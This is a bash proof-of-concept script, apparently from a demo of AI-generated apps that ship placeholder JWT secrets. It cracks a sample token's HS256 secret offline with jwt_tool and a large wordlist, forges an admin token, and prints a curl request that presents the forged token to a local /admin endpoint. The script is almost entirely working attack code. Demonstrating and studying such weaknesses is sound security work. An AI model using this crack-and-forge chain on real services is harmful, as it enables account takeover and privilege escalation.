#!/usr/bin/env bash
# crack-and-forge.sh — run jwt_tool against a sample token, then forge an admin token.
#
# Usage:
#   ./crack-and-forge.sh jwt_001    # cracks 'your-secret-key', forges admin
#   ./crack-and-forge.sh jwt_002    # cracks 'YOUR_SECRET_KEY', forges admin
#
# Optional second argument: path to an alternate wordlist (e.g.,
# wordlists/ai-placeholder-secrets.txt for the small 20-entry list).
#
# Default wordlist is the SecLists Passwords/scraped-JWT-secrets.txt
# file, vendored at wordlists/scraped-JWT-secrets.txt (103,941 entries,
# ~1MB). Both 'your-secret-key' and 'YOUR_SECRET_KEY' are in it.
#
# Prerequisites (see README.md):
#   - jwt_tool cloned to ~/tools/jwt_tool with deps installed in this venv
#   - Python venv at ../../venv with PyJWT installed

set -uo pipefail

DEMO="${1:-jwt_001}"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
WORDLIST="${2:-$SCRIPT_DIR/wordlists/scraped-JWT-secrets.txt}"
JWT_TOOL="${JWT_TOOL:-$HOME/tools/jwt_tool/jwt_tool.py}"
VENV_PYTHON="${VENV_PYTHON:-$(cd "$SCRIPT_DIR/../.." && pwd)/venv/bin/python}"

case "$DEMO" in
  jwt_001)
    SECRET='your-secret-key'
    PORT=5081
    HEADER='x-access-tokens'
    ;;
  jwt_002)
    SECRET='YOUR_SECRET_KEY'
    PORT=3081
    HEADER='Authorization'
    ;;
  *)
    echo "Unknown demo: $DEMO (expected jwt_001 or jwt_002)" >&2
    exit 1
    ;;
esac

if [ ! -f "$JWT_TOOL" ]; then
  echo "jwt_tool not found at $JWT_TOOL." >&2
  echo "Clone it: git clone https://github.com/ticarpi/jwt_tool ~/tools/jwt_tool" >&2
  echo "Then install deps: $VENV_PYTHON -m pip install -r ~/tools/jwt_tool/requirements.txt" >&2
  exit 1
fi

if [ ! -x "$VENV_PYTHON" ]; then
  echo "Python venv not found at $VENV_PYTHON. Create it first." >&2
  exit 1
fi

# Step 1: build a sample token. In a real engagement an attacker would obtain
# this from the target — for the demo, we generate it locally with the actual
# placeholder secret the AI shipped.
#
# Scenario: Alice is a normal user (user #99 — joined the app at some point
# after the first 98 accounts). She captures her own token from the
# Authorization header, cracks the secret offline, then forges a token
# claiming to be user #1 (the original admin account, role=admin).
SAMPLE_TOKEN=$("$VENV_PYTHON" -c "
import jwt
t = jwt.encode({'id': 99, 'role': 'user'}, '$SECRET', algorithm='HS256')
print(t.decode('utf-8') if isinstance(t, bytes) else t)
")

WORDLIST_SIZE=$(wc -l < "$WORDLIST" | tr -d ' ')

# Pretty-print a JWT's header and payload claims to stdout.
# Args: $1 = token, $2 = label for the indent prefix
print_claims() {
    "$VENV_PYTHON" - "$1" <<'PY'
import sys, json, base64

def b64url_decode(s):
    s += '=' * (-len(s) % 4)
    return base64.urlsafe_b64decode(s.encode())

token = sys.argv[1]
header_b64, payload_b64, _sig = token.split('.')
header = json.loads(b64url_decode(header_b64))
payload = json.loads(b64url_decode(payload_b64))
print('    header:  ' + json.dumps(header))
print('    payload: ' + json.dumps(payload))
PY
}

echo "=== $DEMO weak-secret crack ==="
echo "Sample token (would be captured from a target in practice):"
echo "  $SAMPLE_TOKEN"
echo "  decoded claims:"
print_claims "$SAMPLE_TOKEN"
echo
echo "Cracking against $WORDLIST_SIZE candidate secrets in $WORDLIST..."
echo

# Step 2: run jwt_tool. Stream output through grep to avoid huge color/banner
# noise; the relevant line is "[+] <secret> is the CORRECT key!"
START=$(date +%s%N 2>/dev/null || date +%s000000000)
CRACKED=$("$VENV_PYTHON" "$JWT_TOOL" "$SAMPLE_TOKEN" -C -d "$WORDLIST" 2>&1 \
  | grep "is the CORRECT key" \
  | sed -E 's/.*\[\+\] (.*) is the CORRECT key!.*/\1/' \
  | head -1)
END=$(date +%s%N 2>/dev/null || date +%s000000000)

if [ -z "$CRACKED" ]; then
  echo "Crack FAILED — no 'CORRECT key' line in jwt_tool output." >&2
  exit 2
fi

ELAPSED_MS=$(( (END - START) / 1000000 ))
echo "  cracked in ${ELAPSED_MS}ms — secret: $CRACKED"
echo

# Step 3: forge an admin token with the cracked secret.
FORGED=$("$VENV_PYTHON" "$SCRIPT_DIR/forge.py" "$CRACKED" --id 1 --role admin)
echo "Forged admin token:"
echo "  $FORGED"
echo "  decoded claims (note id and role changed from the sample):"
print_claims "$FORGED"
echo
echo "Send to the running server to confirm acceptance:"
echo "  curl -H \"$HEADER: $FORGED\" http://localhost:$PORT/admin"
